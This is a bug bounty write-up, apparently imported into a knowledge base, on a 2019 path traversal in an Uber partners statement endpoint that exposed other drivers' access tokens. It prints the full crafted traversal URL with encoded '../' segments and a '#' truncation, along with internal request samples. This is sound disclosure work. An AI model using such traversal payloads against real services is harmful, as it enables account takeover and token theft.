---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-07_old-but-gold-dot-dot-slash-to-get-the-flag-uber-microservice.md
original_filename: 2019-04-07_old-but-gold-dot-dot-slash-to-get-the-flag-uber-microservice.md
title: Old but GOLD Dot Dot Slash to Get the Flag — Uber Microservice
category: documents
detected_topics:
- api-security
- idor
- access-control
- ssrf
- command-injection
- path-traversal
tags:
- imported
- documents
- api-security
- idor
- access-control
- ssrf
- command-injection
- path-traversal
language: en
raw_sha256: d832aed978ef2a8328ef0f999070d4881511f1d4b81590e85130e4ee52214f1f
text_sha256: 2d1d570f97f70149ad21c3964f0e8da8d2b2bf7a1d730338fff695278c50325a
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Old but GOLD Dot Dot Slash to Get the Flag — Uber Microservice

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-07_old-but-gold-dot-dot-slash-to-get-the-flag-uber-microservice.md
- Source Type: markdown
- Detected Topics: api-security, idor, access-control, ssrf, command-injection, path-traversal
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `d832aed978ef2a8328ef0f999070d4881511f1d4b81590e85130e4ee52214f1f`
- Text SHA256: `2d1d570f97f70149ad21c3964f0e8da8d2b2bf7a1d730338fff695278c50325a`


## Content

---
title: "Old but GOLD Dot Dot Slash to Get the Flag — Uber Microservice"
page_title: "Old but GOLD Dot Dot Slash to Get the Flag — Uber Microservice – Ron Chan"
url: "https://ngailong.wordpress.com/2019/04/07/old-but-gold-dot-dot-slash-to-get-the-flag-uber-microservice/amp/"
final_url: "https://ngailong.wordpress.com/2019/04/07/old-but-gold-dot-dot-slash-to-get-the-flag-uber-microservice/"
authors: ["Ron Chan (@ngalongc)"]
programs: ["Uber"]
bugs: ["SSRF", "Path traversal", "Account takeover"]
publication_date: "2019-04-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5323
---

# Old but GOLD Dot Dot Slash to Get the Flag — Uber Microservice

[ronchan](https://ngailong.wordpress.com/author/ngalog/) [Uncategorized](https://ngailong.wordpress.com/category/uncategorized/) April 7, 2019 3 Minutes

Uber is built on a bunch of [microservices](https://eng.uber.com/tag/microservice/), naturally, if you want to interact with microservice, you may want to use some REST apis to do it. Say you want to fetch the driver’s past trip history, you call an API that looks like 
  
  
  https://localhost:1234/partner/PARTNER_UUID/trips?from=2018-01-01&to=2019-01-01

Obviously, all of these are performed in the backend, because usually the internal microservices have no permission check or other security measure to prevent IDOR attack. What’s the point to implement authorization check if all of these API calls are predefined path/variables/host. Users can’t control the call anyway, why bother.

This is only true when user really can’t control the API call, back in early 2018, I found an interesting endpoint in partners.uber.com to fetch for monthly statement of driver, that looks something like this.
  
  
  https://partners.uber.com/p3/money/statements/view/current

This is call itself has nothing useful but the response is really the reason I got interested
  
  
  {
  "request": {
  "uri": {
  "protocol": "http:",
  "slashes": true,
  "auth": null,
  "host": "127.0.0.1:123",
  "port": "123",
  "hostname": "127.0.0.1",
  "hash": null,
  "search": "?earnings_structure_type=&locale=en&user_id=xxxxx",
  "query": "earnings_structure_type=&locale=en&user_id=xxxxx",
  "pathname": "/v1/partners/xxxxx/statements/current",
  "path": "/v1/partners/xxxxxx/statements/current?earnings_structure_type=&locale=en&user_id=xxxxx",
  "href": "http://127.0.0.1:123/v1/partners/xxxxx/statements/current?earnings_structure_type=&locale=en&user_id=xxxxxx"
  },
  "token":"ACCESS_TOKEN_OF_USER",
  ....

It is obvious that the API call is taking **current** in the **<https://partners.uber.com/p3/money/statements/view/current>** , and take **current** and append it to the end of **/v1/partners/xxxxxx/statements/** , as the response suggests. Also the query part is added to the call as well. The full internal GET request looks like this
  
  
  http://127.0.0.1:123/v1/partners/xxxx/statements/current?earnings_structure_type=&locale=en&user_id=xxxx

It is very interesting because of two observations from the response, first big one is that it has the access token of your uber user, and we know why this is [interesting.](https://hackerone.com/reports/293363)

Second one is that there is no x-auth-header or authorization headers in the request, yet it still return the access token of user in response! It means if we can somehow manipulate the request change **my_user_uuid** to **victim_uuid** in the request. Then we can takeover victim’s account by getting their access token from the response

I need to find an endpoint that allow me to do the following things

  * Pass any parameter to that internal GET request
  * Pass encoded character the that internal GET request to get rid of the unnecessary query in behind (`%23`, i.e. `#` can break the query part)
  * View the full response

It turns out, a very similar request allowed me to do all that
  
  
  https://partners.uber.com/p3/money/statements/view/4cb88fb1-d3fa-3a10-e3b5-ceef8ca71faa
  
  Response of the GET request
  
  "href": "http://127.0.0.1:123/v1/statements/4cb88fb1-d3fa-3a10-e3b5-ceef8ca71faa?earnings_structure_type=&locale=en&statement_uuid=4cb88fb1-d3fa-3a10-e3b5-ceef8ca71faa&user_id=your_user_id"

I think the statement uuid **4cb88fb1-d3fa-3a10-e3b5-ceef8ca71faa** is passed to the internal API GET request for both path and query part. I verifed that by sending this request
  
  
  https://partners.uber.com/p3/money/statements/view/4cb88fb1-d3fa-3a10-e3b5-ceef8ca71faa%2f..%2f4cb88fb1-d3fa-3a10-e3b5-ceef8ca71faa

And the response is still the same, it proves ../ is useful for escaping the path! So it is clear what should we do next. Escape all the way through to root, then craft a request looks just like the one that would return access token in response, and cancel the unnecessary part using **#**

Target request we want to call
  
  
  http://127.0.0.1:123/v1/partners/victim_uuid/statements/current?earnings_structure_type=&locale=en&user_id=victim_uuid

Request that is under our control
  
  
  http://127.0.0.1:123/v1/statements/INJECTION_HERE?earnings_structure_type=&locale=en&statement_uuid=INJECTION_HERE&user_id=your_user_id

And this is the final call I came up with
  
  
  https://partners.uber.com/p3/money/statements/view/15327ef1-2acc-e468-e17a-576a7d12312%2f..%2f..%2f..%2Fv1%2Fpartners%2FVICTIM_UUID%2Fstatements%2Fcurrent%3Fearnings_structure_type%3D%26locale%3Den%26user_id%3DVICTIM_UUID%23

The response is just as expected
  
  
  http://127.0.0.1:123/v1/statements/15327ef1-2acc-e468-e17a-576a7d12312/../../../v1/partners/VICTIM_UUID/statements/current?earnings_structure_type=&locale=en&user_id=VICTIM_UUID#......

And now we can get any user’s access token by changing the VICTIM_UUID in the request.

### Share this:

  * [ Share on X (Opens in new window) X ](https://ngailong.wordpress.com/2019/04/07/old-but-gold-dot-dot-slash-to-get-the-flag-uber-microservice/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://ngailong.wordpress.com/2019/04/07/old-but-gold-dot-dot-slash-to-get-the-flag-uber-microservice/?share=facebook)
  * 

Like Loading...

### _Related_

  * Tagged
  * [bug bounty](https://ngailong.wordpress.com/tag/bug-bounty/)
  * [microservice](https://ngailong.wordpress.com/tag/microservice/)
  * [uber](https://ngailong.wordpress.com/tag/uber/)

![Unknown's avatar](https://0.gravatar.com/avatar/02d7d4122d9839f262d9a2d0277d82c1bbfba559db8a9558017d15062ab83007?s=80&d=identicon&r=G)

##  Published by ronchan

@ngalongc [ View all posts by ronchan ](https://ngailong.wordpress.com/author/ngalog/)

**Published** April 7, 2019
